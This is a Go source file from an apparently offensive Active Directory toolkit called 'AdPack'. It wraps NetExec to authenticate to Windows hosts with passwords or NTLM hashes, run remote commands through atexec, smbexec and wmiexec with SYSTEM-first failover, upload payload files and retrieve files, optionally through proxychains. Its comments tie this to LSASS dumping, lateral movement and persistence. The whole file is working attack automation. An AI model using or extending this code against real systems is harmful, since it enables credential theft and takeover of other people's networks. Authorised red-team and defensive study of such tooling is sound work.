package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"adpack/utils"
)

// NxcJSONResult is a single line from nxc --json output.
// nxc emits one JSON object per target per result line.
type NxcJSONResult struct {
	Host     string `json:"host"`
	Hostname string `json:"hostname"`
	Domain   string `json:"domain"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Signing  bool   `json:"signing"`
	Auth     bool   `json:"auth"`
	Error    string `json:"error"`
	Raw      string `json:"-"` // original line for debugging
}

// ParseNxcJSON parses nxc --json stdout into structured results.
// Each non-empty line is expected to be a JSON object.
func ParseNxcJSON(out string) []NxcJSONResult {
	if out == "" {
		return nil
	}
	var results []NxcJSONResult
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		var r NxcJSONResult
		if err := json.Unmarshal([]byte(line), &r); err != nil {
			// Not JSON — skip (nxc sometimes mixes text with JSON)
			continue
		}
		r.Raw = line
		results = append(results, r)
	}
	return results
}

// NxcJSONAuthSucceeded checks whether any JSON result line indicates
// successful authentication. Preferred over NxcAuthSucceeded (text parsing)
// when --json was used.
func NxcJSONAuthSucceeded(results []NxcJSONResult, username string) bool {
	for _, r := range results {
		if r.Auth && r.Username == username {
			return true
		}
	}
	return false
}

type nxcTool struct{}

var NetExec = nxcTool{}

// NetexecCommand and NetexecPrefixArgs are package-level globals set once
// during initialization. The proxy transport calls SetProxyMode() before any
// concurrent use to wrap netexec in proxychains4.
var (
	netexecMu         sync.RWMutex
	NetexecCommand    = "netexec"
	NetexecPrefixArgs []string
)

// SetProxyMode configures netexec to run through proxychains4.
// Must be called before any concurrent execution (typically once at startup).
func SetProxyMode(addr string) {
	netexecMu.Lock()
	defer netexecMu.Unlock()
	NetexecCommand = "proxychains4"
	NetexecPrefixArgs = []string{"-q", "netexec"}
}

func getNetexecCommand() string {
	netexecMu.RLock()
	defer netexecMu.RUnlock()
	return NetexecCommand
}

func getNetexecPrefixArgs() []string {
	netexecMu.RLock()
	defer netexecMu.RUnlock()
	return NetexecPrefixArgs
}

func (nxcTool) Name() string { return getNetexecCommand() }
func (nxcTool) Available() bool {
	_, err := utils.FindTool(getNetexecCommand())
	return err == nil
}

type NetExecTarget struct {
	Protocol string // smb, ldap, winrm, mssql
	Host     string
	Port     int
	Domain   string
	Username string
	Password string
	Hash     string
	JSON     bool // append --json flag for structured output
}

// NxcAuthSucceeded inspects nxc stdout/stderr to determine whether the
// authentication step itself worked. nxc exits with code 0 even when auth
// fails (it just prints `[-] domain\user:pass` and moves on), so a naive
// `r.Success` check yields false positives for every command that depends on
// a working session.
//
// Returns true only if a positive auth line is present AND no negative auth
// line is present for the same principal. The caller passes the actual
// username it sent so we don't get fooled by null-session probes that nxc
// adds at startup.
func NxcAuthSucceeded(out, username string) bool {
	if out == "" {
		return false
	}
	pos := false
	for _, line := range strings.Split(out, "\n") {
		// Per-principal positive marker, e.g.
		//   SMB ... [+] dom\user:pass
		// We do not need to match the whole user — nxc may print just `\:`
		// for null auth; restrict to lines that mention the username we sent.
		if strings.Contains(line, "[+]") && strings.Contains(line, username) {
			pos = true
		}
		// Hard auth failure markers.
		if strings.Contains(line, "[-]") && strings.Contains(line, username) {
			lo := strings.ToLower(line)
			for _, m := range []string{
				"status_logon_failure",
				"status_access_denied",
				"status_account_locked",
				"status_account_disabled",
				"status_password_expired",
				"kdc_err_preauth_failed",
				"kdc_err_c_principal_unknown",
				"invalid credentials",
				"authentication failed",
			} {
				if strings.Contains(lo, m) {
					return false
				}
			}
		}
	}
	return pos
}

// NxcCommandSucceeded checks whether nxc actually executed an `-x <cmd>`
// shell command on the remote host. nxc on a non-admin auth simply skips
// the exec phase silently and exits 0; we need stronger evidence than the
// process exit code.
//
// False-positive: nxc prints "[+] Executed command via atexec" even when
// the scheduled task XML is malformed and the command never runs
// (SCHED_E_MALFORMEDXML on Server 2019+).
//
// Another false-positive: cross-domain SMB Kerberos auth against a target
// in a trusted domain may exit 0 with "[+] Executed command" even though
// the underlying transport yielded STATUS_MORE_PROCESSING_REQUIRED and
// the command never ran.
//
// Positive patterns:
//   - "executed command via" (atexec/wmiexec/smbexec)
//   - "executed command (shell type:" (WinRM)
//   - "command executed with no output"
//   - Real stdout containing domain\user (whoami output)
func NxcCommandSucceeded(stdout, stderr string) bool {
	if stdout == "" && stderr == "" {
		return false
	}
	combined := strings.ToLower(stdout + "\n" + stderr)

	// Hard failure: scheduled task XML malformation means the task was
	// never created and the command never ran. This takes precedence over
	// the misleading "[+] Executed command" that nxc prints anyway.
	if strings.Contains(combined, "sched_e_malformedxml") {
		return false
	}

	// Hard failure: cross-domain SMB transport blocked. nxc may still
	// print "[+]" when the underlying session failed at the Kerberos
	// transport layer, so we need an explicit check here.
	if strings.Contains(combined, "status_more_processing_required") {
		return false
	}

	if strings.Contains(combined, "executed command via") ||
		strings.Contains(combined, "command executed with no output") ||
		strings.Contains(combined, "executed command (shell type:") {
		return true
	}
	// Fallback: real `whoami`-style output contains a domain\user token on
	// its own line (the leading `[*]` from the protocol summary doesn't).
	for _, line := range strings.Split(stdout, "\n") {
		t := strings.TrimSpace(line)
		// Skip nxc framing.
		if t == "" || strings.HasPrefix(t, "[") {
			continue
		}
		// Anything that looks like `domain\username` *not* followed by `:`
		// (which would be the auth banner) is real command output.
		if i := strings.IndexByte(t, '\\'); i > 0 && i < len(t)-1 {
			if !strings.Contains(t[i:], ":") {
				return true
			}
		}
	}
	return false
}

func (n nxcTool) Run(ctx context.Context, target NetExecTarget, subcmd string, extraArgs []string) (utils.CmdResult, error) {
	prefix := getNetexecPrefixArgs()
	args := make([]string, 0, len(prefix)+3+len(extraArgs))
	args = append(args, prefix...)
	args = append(args, target.Protocol, target.Host)
	if target.Port > 0 {
		args = append(args, fmt.Sprintf("--port=%d", target.Port))
	}
	if target.Domain != "" {
		args = append(args, "-d", target.Domain)
	}
	if target.Username != "" {
		args = append(args, "-u", target.Username)
	}
	if target.Password != "" {
		args = append(args, "-p", target.Password)
	}
	if target.Hash != "" {
		args = append(args, "-H", target.Hash)
	}
	if subcmd != "" {
		args = append(args, subcmd)
	}
	if target.JSON {
		args = append(args, "--json")
	}
	args = append(args, extraArgs...)
	r := utils.RunCommandCtx(ctx, getNetexecCommand(), args)
	if !r.Success {
		return r, fmt.Errorf("netexec failed: %s", r.Stderr)
	}

	combined := r.Stdout + "\n" + r.Stderr

	// Validate auth evidence when credentials are provided. nxc exits 0 even
	// on auth failure (it prints a [-] line and moves on), so exit code alone
	// is insufficient. This check catches false-positive auth probes that
	// would otherwise poison planner state and confidence scoring.
	if target.Username != "" && !NxcAuthSucceeded(combined, target.Username) {
		r.Success = false
		return r, fmt.Errorf("auth failed for %s\\%s on %s",
			target.Domain, target.Username, target.Host)
	}

	// Validate execution evidence for remote command execution (-x/-X).
	// nxc exits 0 even when the user lacks admin rights and the command
	// silently no-ops. This catches false-positive exec results that
	// would make deploy/lateral/persistence look successful when they
	// did nothing.
	// Check both subcmd (direct -x/-X) and extraArgs (used by --exec-method).
	if subcmd == "-x" || subcmd == "-X" {
		if !NxcCommandSucceeded(r.Stdout, r.Stderr) {
			r.Success = false
			return r, fmt.Errorf("command execution failed on %s (not admin?)", target.Host)
		}
	}
	for _, a := range extraArgs {
		if a == "-x" || a == "-X" {
			if !NxcCommandSucceeded(r.Stdout, r.Stderr) {
				r.Success = false
				return r, fmt.Errorf("command execution failed on %s (not admin?)", target.Host)
			}
			break
		}
	}

	return r, nil
}

func (n nxcTool) PutFile(ctx context.Context, target NetExecTarget, localPath, remoteDir string) (utils.CmdResult, error) {
	// filepath.Base is OS-aware (handles both / and \ on Windows operator boxes).
	base := filepath.Base(localPath)
	if base == "." || base == "/" || base == `\` {
		base = "payload.bin"
	}

	remotePath := strings.TrimPrefix(remoteDir, `C:\`)
	remotePath = strings.TrimPrefix(remotePath, `c:\`)
	remotePath = strings.TrimPrefix(remotePath, `C$\`)
	remotePath = strings.TrimLeft(remotePath, `/\`)

	// Only treat remoteDir as a directory when it has an explicit trailing
	// separator (\ or /). This check uses strings.HasSuffix to detect the
	// trailing separator, avoiding misclassification of extensionless executables.
	if strings.HasSuffix(remoteDir, `\`) || strings.HasSuffix(remoteDir, `/`) {
		if remotePath != "" {
			remotePath = strings.TrimRight(remotePath, `/\`) + `\` + base
		} else {
			remotePath = base
		}
	}

	fmt.Printf("[*] PutFile: %s → %s\n", localPath, remotePath)
	return n.Run(ctx, target, "--put-file", []string{localPath, remotePath})
}

func (n nxcTool) GetFile(ctx context.Context, target NetExecTarget, remotePath, localDir string) (utils.CmdResult, error) {
	cleanPath := strings.TrimPrefix(remotePath, `C:\`)
	cleanPath = strings.TrimPrefix(cleanPath, `c:\`)
	cleanPath = strings.TrimPrefix(cleanPath, `C$/`)
	cleanPath = strings.TrimLeft(cleanPath, `/\`)
	return n.Run(ctx, target, "--get-file", []string{cleanPath, localDir})
}

// ExecMethodOrder is the canonical failover sequence for remote command execution.
// wmiexec runs as the authenticated user; smbexec/atexec run as SYSTEM (service
// or task scheduler). Reordered to prefer SYSTEM-context methods (atexec first)
// because most AdPack operations (LSASS dump, service create, etc.) require
// elevation. wmiexec is last since it runs as user and silently no-ops on
// most privileged operations.
var ExecMethodOrder = []string{"atexec", "smbexec", "wmiexec"}

// FailoverResult captures which exec-method actually returned output, useful for
// downstream parsing (e.g. SYSTEM-context detection) and evidence logging.
type FailoverResult struct {
	utils.CmdResult
	Method string
}

// RunFailover executes a shell command on the target trying each exec-method
// in order until one succeeds within the per-attempt timeout. Returns the first
// successful result, or the last attempted result if all failed.
//
// Use this for any remote command where the *output* matters. For fire-and-forget
// payloads, prefer Run with `start /B` directly so you don't pay the failover cost.
func (n nxcTool) RunFailover(ctx context.Context, target NetExecTarget, command string, perAttempt time.Duration) (FailoverResult, error) {
	if perAttempt <= 0 {
		perAttempt = 45 * time.Second
	}
	var last FailoverResult
	var lastErr error
	for _, method := range ExecMethodOrder {
		attemptCtx, cancel := context.WithTimeout(ctx, perAttempt)
		r, err := n.Run(attemptCtx, target, "--exec-method", []string{method, "-x", command})
		cancel()
		last = FailoverResult{CmdResult: r, Method: method}
		lastErr = err
		if err == nil && r.Success {
			return last, nil
		}
		// Don't keep retrying if the parent context was cancelled
		if ctx.Err() != nil {
			return last, ctx.Err()
		}
	}
	return last, lastErr
}
